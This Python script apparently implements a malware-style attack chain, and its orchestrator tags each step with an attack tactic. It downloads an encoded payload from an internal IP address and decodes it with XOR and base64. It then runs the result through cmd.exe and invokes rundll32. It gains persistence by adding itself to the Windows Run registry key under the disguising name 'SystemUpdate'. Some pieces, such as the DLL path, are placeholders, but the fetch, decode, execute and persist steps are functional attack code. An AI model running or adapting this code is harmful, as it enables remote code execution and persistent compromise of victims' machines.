#!/usr/bin/env python3
import sys, json, time, subprocess, os
from typing import Dict, Any
import requests
import base64

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    url = "https://192.168.1.100/configuration"

    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()

        file_content = bytearray()
        for chunk in response.iter_content(8192):
            file_content.extend(chunk)

        if len(file_content) > 0:
            result = {'content': file_content.hex()}
        else:
            result = {'content': None}

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'content': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Retrieve the content from input_data
        content = bytes.fromhex(input_data.get('content', ''))

        # XOR key (for demonstration purposes, a simple static key is used)
        xor_key = b'\xAA'  # Example XOR key

        # XOR decryption
        decoded_bytes = bytes(b ^ xor_key[0] for b in content)

        # Base64 decode
        decoded_data = base64.b64decode(decoded_bytes)

        # Prepare the result
        result = {
            'decoded_data': decoded_data.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'decoded_data': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Decode the input data
        decoded_data = bytes.fromhex(input_data.get('decoded_data', ''))

        # Convert decoded data to a command string
        command = decoded_data.decode('utf-8')

        # Execute the command using cmd.exe
        cmd_result = subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30)
        
        # Check if the command execution was successful
        if cmd_result.returncode != 0:
            # Log the error and continue
            print(f"cmd.exe execution failed: {cmd_result.stderr}")

        # Assume the decoded data is a DLL path and entrypoint for rundll32.exe
        # For demonstration purposes, let's assume the DLL path and entrypoint are part of the command
        # This is a simplification and may not reflect real-world usage
        dll_path = "example.dll"  # Placeholder for DLL path
        entrypoint = "exampleFunction"  # Placeholder for entrypoint

        # Execute the DLL using rundll32.exe
        rundll_result = subprocess.run(['rundll32.exe', dll_path, entrypoint], capture_output=True, timeout=30)

        # Check if the DLL execution was successful
        if rundll_result.returncode != 0:
            # Log the error and return success=False
            print(f"rundll32.exe execution failed: {rundll_result.stderr}")
            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # If both executions are successful
        return {'success': True, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}', 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Determine the executable path
        exe_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(sys.argv[0])
        
        # Define the registry key name
        key_name = "SystemUpdate"

        # Open the registry key for setting the value
        # Since winreg is not available on non-Windows platforms, this block should be conditional
        if os.name == 'nt':
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as key:
                # Set the registry value
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
                
                # Verify by reading back the value
                registered_exe_path, _ = winreg.QueryValueEx(key, key_name)
                registered = (registered_exe_path == exe_path)
        else:
            registered = False

        result = {'registered': registered}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'registered': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decode Configuration File [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))